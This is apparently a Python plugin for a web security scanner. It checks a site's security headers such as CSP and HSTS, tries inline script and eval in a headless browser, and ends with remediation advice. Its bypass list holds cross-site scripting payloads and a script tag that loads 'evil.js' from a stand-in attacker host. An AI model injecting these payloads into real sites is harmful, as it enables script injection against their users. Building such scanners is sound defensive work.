"""
Security Misconfiguration Exploit Plugin

This plugin exploits security misconfigurations including:
- Missing or weak security headers
- CSP policy weaknesses (wildcards, unsafe-inline, unsafe-eval)
- HSTS issues
- CORS misconfigurations
- Cookie security issues
- Browser-based exploitation of identified misconfigurations

Features:
- Comprehensive header checking (CSP, HSTS, CORP, COOP, COEP, Permissions-Policy, Referrer-Policy, X-XSS-Protection)
- CSP bypass technique detection
- Browser automation to test actual exploitability
- Screenshot evidence capture
- Detailed remediation advice
"""

import sys
import os
import logging
import re
import tempfile
from typing import Dict, List, Any, Optional, Tuple, Set
from urllib.parse import urlparse, urljoin

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.adaptive_exploit_mixin import AdaptiveExploitMixin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.common.exceptions import TimeoutException
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False

logger = logging.getLogger(__name__)


class SecurityMisconfigurationPlugin(ExploitPlugin, AdaptiveExploitMixin):
    """
    Security misconfiguration exploit plugin.
    
    Tests and exploits security misconfigurations in web applications.
    """
    
    # Security headers to check
    SECURITY_HEADERS = {
        'Content-Security-Policy': {
            'check_missing': True,
            'check_weak': True,
            'weak_patterns': [
                r"'unsafe-inline'",
                r"'unsafe-eval'",
                r'https://\*',
                r'http://\*',
                r'\*\.\*',
            ],
            'severity': 'high'
        },
        'Strict-Transport-Security': {
            'check_missing': True,
            'check_weak': True,
            'weak_patterns': [
                r'max-age=0',
            ],
            'severity': 'high',
            'custom_check': 'validate_hsts'
        },
        'X-Frame-Options': {
            'check_missing': True,
            'severity': 'medium'
        },
        'X-Content-Type-Options': {
            'check_missing': True,
            'severity': 'medium'
        },
        'Referrer-Policy': {
            'check_missing': True,
            'severity': 'low'
        },
        'Permissions-Policy': {
            'check_missing': True,
            'severity': 'low'
        },
        'Cross-Origin-Opener-Policy': {
            'check_missing': True,
            'severity': 'low'
        },
        'Cross-Origin-Embedder-Policy': {
            'check_missing': True,
            'severity': 'low'
        },
        'Cross-Origin-Resource-Policy': {
            'check_missing': True,
            'severity': 'low'
        },
        'X-XSS-Protection': {
            'check_missing': False,  # Deprecated but check if present
            'check_weak': True,
            'weak_patterns': [r'0'],  # X-XSS-Protection: 0 disables protection
            'severity': 'low'
        },
    }
    
    # CSP bypass techniques
    CSP_BYPASS_TECHNIQUES = {
        'unsafe-inline': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
        ],
        'unsafe-eval': [
            '<script>eval("alert(1)")</script>',
            '<script>Function("alert(1)")()</script>',
        ],
        'wildcard_domain': [
            '<script src="https://attacker.com/evil.js"></script>',
        ],
    }
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'security_misconfiguration'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'Security Misconfiguration Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Security misconfiguration exploit plugin for testing and exploiting '
            'weak or missing security headers, CSP policies, and related issues.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '1.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate payloads for exploiting security misconfigurations.
        
        Args:
            context: Optional context with misconfiguration details
        
        Returns:
            List of exploitation payloads
        """
        context = context or {}
        payloads = []
        
        misconfiguration_type = context.get('misconfiguration_type', '')
        
        if 'csp' in misconfiguration_type.lower():
            # Generate CSP bypass payloads
            csp_header = context.get('csp_header', '')
            
            if 'unsafe-inline' in csp_header:
                payloads.extend(self.CSP_BYPASS_TECHNIQUES['unsafe-inline'])
            
            if 'unsafe-eval' in csp_header:
                payloads.extend(self.CSP_BYPASS_TECHNIQUES['unsafe-eval'])
            
            if '*' in csp_header:
                payloads.extend(self.CSP_BYPASS_TECHNIQUES['wildcard_domain'])
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute security misconfiguration exploitation.
        
        Args:
            target_url: Target URL
            vulnerability_data: Misconfiguration details
            config: Optional configuration
        
        Returns:
            Attack results
        """
        config = config or {}
        logger.info(f"Starting security misconfiguration exploitation for {target_url}")
        
        results = {
            'success': False,
            'verified': False,
            'evidence': {},
            'proof_of_exploit': {},
            'error': None
        }
        
        try:
            # Check headers
            header_results = self._check_security_headers(target_url, config)
            results['evidence']['headers'] = header_results
            
            # If weak CSP detected, attempt browser-based exploitation
            if config.get('test_browser_exploits', False) and header_results.get('weak_csp'):
                exploit_results = self._test_csp_exploitation(
                    target_url,
                    header_results['weak_csp'],
                    config
                )
                results['proof_of_exploit']['csp_exploitation'] = exploit_results
                
                if exploit_results.get('exploitable'):
                    results['success'] = True
                    results['verified'] = True
            
            # Check if any issues found
            if header_results.get('missing_headers') or header_results.get('weak_headers'):
                results['success'] = True
            
        except Exception as e:
            logger.error(f"Security misconfiguration exploitation failed: {e}", exc_info=True)
            results['error'] = str(e)
        
        return results
    
    def _check_security_headers(self, url: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Check security headers on the target URL.
        
        Args:
            url: Target URL
            config: Configuration
        
        Returns:
            Dictionary with header analysis results
        """
        if not HAS_REQUESTS:
            return {'error': 'Requests library not available'}
        
        results = {
            'missing_headers': [],
            'weak_headers': [],
            'weak_csp': None,
            'header_values': {}
        }
        
        try:
            timeout = config.get('timeout', 10)
            response = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
            headers = {k.lower(): v for k, v in response.headers.items()}
            
            # Check each security header
            for header_name, header_config in self.SECURITY_HEADERS.items():
                header_key = header_name.lower()
                
                if header_key in headers:
                    header_value = headers[header_key]
                    results['header_values'][header_name] = header_value
                    
                    # Check for weak configurations
                    if header_config.get('check_weak'):
                        is_weak = False
                        weak_reason = None
                        
                        # Check custom validation if specified
                        if header_config.get('custom_check'):
                            custom_check = header_config['custom_check']
                            if custom_check == 'validate_hsts':
                                is_weak, weak_reason = self._validate_hsts(header_value)
                        
                        # Check weak patterns if not already flagged
                        if not is_weak:
                            weak_patterns = header_config.get('weak_patterns', [])
                            for pattern in weak_patterns:
                                if re.search(pattern, header_value, re.IGNORECASE):
                                    is_weak = True
                                    weak_reason = f'Weak configuration matching pattern: {pattern}'
                                    break
                        
                        if is_weak:
                            results['weak_headers'].append({
                                'header': header_name,
                                'value': header_value,
                                'issue': weak_reason,
                                'severity': header_config['severity']
                            })
                            
                            # Track weak CSP separately for exploitation
                            if header_name == 'Content-Security-Policy':
                                results['weak_csp'] = header_value
                else:
                    # Header is missing
                    if header_config.get('check_missing'):
                        results['missing_headers'].append({
                            'header': header_name,
                            'severity': header_config['severity']
                        })
            
            logger.info(f"Found {len(results['missing_headers'])} missing headers and "
                       f"{len(results['weak_headers'])} weak headers")
            
        except Exception as e:
            logger.error(f"Failed to check security headers: {e}")
            results['error'] = str(e)
        
        return results
    
    def _validate_hsts(self, hsts_value: str) -> Tuple[bool, Optional[str]]:
        """
        Validate HSTS header value.
        
        Args:
            hsts_value: HSTS header value
        
        Returns:
            Tuple of (is_weak, reason)
        """
        # Extract max-age value
        max_age_match = re.search(r'max-age=(\d+)', hsts_value, re.IGNORECASE)
        if not max_age_match:
            return True, 'HSTS header missing max-age directive'
        
        max_age = int(max_age_match.group(1))
        
        # Check if less than 1 year (31536000 seconds)
        if max_age < 31536000:
            return True, f'HSTS max-age ({max_age}) is less than recommended 1 year (31536000)'
        
        # Check for includeSubDomains
        if 'includesubdomains' not in hsts_value.lower():
            # Not necessarily weak, but worth noting
            pass
        
        return False, None
    
    def _test_csp_exploitation(self, url: str, csp_header: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Test CSP policy exploitation using browser automation.
        
        Args:
            url: Target URL
            csp_header: CSP header value
            config: Configuration
        
        Returns:
            Exploitation test results
        """
        browser_engine = config.get('browser_engine', 'playwright')
        
        if browser_engine == 'playwright' and HAS_PLAYWRIGHT:
            return self._test_csp_with_playwright(url, csp_header, config)
        elif browser_engine == 'selenium' and HAS_SELENIUM:
            return self._test_csp_with_selenium(url, csp_header, config)
        else:
            return {
                'exploitable': False,
                'error': f'Browser automation not available (engine: {browser_engine})'
            }
    
    def _test_csp_with_playwright(self, url: str, csp_header: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Test CSP exploitation using Playwright."""
        if not HAS_PLAYWRIGHT:
            return {'exploitable': False, 'error': 'Playwright not available'}
        
        results = {
            'exploitable': False,
            'bypass_method': None,
            'evidence': {},
            'screenshot': None
        }
        
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=config.get('browser_headless', True))
                context = browser.new_context()
                page = context.new_page()
                
                # Track console messages
                console_messages = []
                page.on('console', lambda msg: console_messages.append(msg.text))
                
                # Navigate to page
                page.goto(url, timeout=config.get('timeout', 30) * 1000)
                
                # Test different bypass techniques
                if 'unsafe-inline' in csp_header.lower():
                    # Try inline script injection
                    try:
                        page.evaluate('alert(1)')
                        results['exploitable'] = True
                        results['bypass_method'] = 'unsafe-inline'
                        results['evidence']['technique'] = 'Inline script execution allowed'
                    except Exception:
                        pass
                
                if 'unsafe-eval' in csp_header.lower():
                    # Try eval injection
                    try:
                        page.evaluate('eval("alert(1)")')
                        results['exploitable'] = True
                        results['bypass_method'] = 'unsafe-eval'
                        results['evidence']['technique'] = 'eval() execution allowed'
                    except Exception:
                        pass
                
                # Capture screenshot if requested
                if config.get('capture_screenshots', False) and results['exploitable']:
                    with tempfile.NamedTemporaryFile(mode='wb', suffix='.png', delete=False) as f:
                        screenshot_path = f.name
                    page.screenshot(path=screenshot_path)
                    results['screenshot'] = screenshot_path
                
                results['evidence']['console_messages'] = console_messages
                
                browser.close()
                
        except Exception as e:
            logger.error(f"Playwright CSP test failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def _test_csp_with_selenium(self, url: str, csp_header: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Test CSP exploitation using Selenium."""
        if not HAS_SELENIUM:
            return {'exploitable': False, 'error': 'Selenium not available'}
        
        results = {
            'exploitable': False,
            'bypass_method': None,
            'evidence': {},
            'screenshot': None
        }
        
        try:
            options = ChromeOptions()
            if config.get('browser_headless', True):
                options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(config.get('timeout', 30))
            
            # Navigate to page
            driver.get(url)
            
            # Test different bypass techniques
            if 'unsafe-inline' in csp_header.lower():
                try:
                    driver.execute_script('alert(1)')
                    results['exploitable'] = True
                    results['bypass_method'] = 'unsafe-inline'
                    results['evidence']['technique'] = 'Inline script execution allowed'
                except Exception:
                    pass
            
            if 'unsafe-eval' in csp_header.lower():
                try:
                    driver.execute_script('eval("alert(1)")')
                    results['exploitable'] = True
                    results['bypass_method'] = 'unsafe-eval'
                    results['evidence']['technique'] = 'eval() execution allowed'
                except Exception:
                    pass
            
            # Capture screenshot if requested
            if config.get('capture_screenshots', False) and results['exploitable']:
                with tempfile.NamedTemporaryFile(mode='wb', suffix='.png', delete=False) as f:
                    screenshot_path = f.name
                driver.save_screenshot(screenshot_path)
                results['screenshot'] = screenshot_path
            
            driver.quit()
            
        except Exception as e:
            logger.error(f"Selenium CSP test failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice."""
        return """
Security Misconfiguration Remediation:

1. Content-Security-Policy (CSP):
   - Implement a strict CSP policy
   - Avoid 'unsafe-inline' and 'unsafe-eval'
   - Use nonces or hashes for inline scripts
   - Avoid wildcard domains in directives

2. Strict-Transport-Security (HSTS):
   - Set max-age to at least 31536000 (1 year)
   - Include 'includeSubDomains' directive
   - Consider HSTS preloading

3. X-Frame-Options:
   - Set to 'DENY' or 'SAMEORIGIN'
   - Or use CSP frame-ancestors directive

4. X-Content-Type-Options:
   - Set to 'nosniff'

5. Referrer-Policy:
   - Use 'no-referrer' or 'strict-origin-when-cross-origin'

6. Permissions-Policy:
   - Restrict dangerous features (camera, microphone, geolocation)

7. Cross-Origin Policies (COOP, COEP, CORP):
   - Implement appropriate cross-origin isolation
"""
    
    def get_severity_level(self) -> str:
        """Return severity level."""
        return 'high'


# Export the plugin
__all__ = ['SecurityMisconfigurationPlugin']
